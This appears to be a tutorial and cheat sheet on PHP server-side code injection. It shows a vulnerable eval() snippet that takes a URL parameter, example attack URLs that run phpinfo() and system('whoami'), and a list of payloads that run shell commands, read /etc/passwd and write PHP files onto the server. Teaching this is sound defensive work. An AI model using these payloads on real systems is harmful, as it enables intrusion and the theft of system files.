# Server Side Code Injection (PHP) 
Code injection is the embedding of code into software, which disturbs the functioning of the software. The code introduced to the software can disturb the database integrity, security, features, etc.

PHP code injection is a vulnerability that allows an attacker to inject custom code into the server side scripting engine. This vulnerability occurs when an attacker can control all or part of an input string that is fed into an eval() function call. Eval will execute the argument as code.

Code Injection differs from Command Injection in that an attacker is only limited by the functionality of the injected language itself. If an attacker is able to inject PHP code into an application and have it executed, they are only limited by what PHP is capable of. Command injection consists of leveraging existing code to execute commands, usually within the context of a shell

# What Is PHP Code Injection
PHP code vulnerability is caused when invalid data is processed in which an attacker can control all or part of the input field. PHP code vulnerability allows an attacker to inject malicious code on input and as soon as the process goes to the server it can be exploited.

There are servers having vulnerabilities that can lead to PHP code injection. It allows an attacker to inject custom code into the server. This vulnerability is encountered when an attacker can control all parts of an input string. The attacker can feed the input string into an eval function call. The eval function will execute the statement as code.

## Posiblity of attack
  These types of attacks are usually made possible due to a lack of proper input/output data validation, for example:

  • allowed characters (standard regular expressions classes or custom)

  • data format

  • amount of expected data
  
 ### Example
       //The URL to access this https://www.example.com/index.php?id=1
        $id = "idnumber";
        $x = $_GET['id'];
        eval("\$id = \$x;");
        
  ###### In this web application, there is no input validation.

  ###### https://www.example.com/index.php?id=1; phpinfo()

  ###### The above URL will show all the info about the PHP version.

  ###### An attacker can execute system commands by requesting the below URL.

  ###### https://www.example.com/index.php?id=1; system(‘whoami’)

  ###### The above URL will show the output of the command
  
  ## PHP Code Injection Payloads
  
    system('id')
    exec('id')
    shell_exec('id')
    passthru('id')
    exec('id')
    `id`
    echo `id`
    readfile('/etc/passwd')
    file_get_contents('/etc/passwd')
    pcntl_exec("id")
    $file = fopen("test1.txt", "w"); echo fwrite($file, "hello world"); fclose($file);
    $file = fopen("phpinfo.php", "w"); echo fwrite($file, "<?php phpinfo() ?>"); fclose($file);
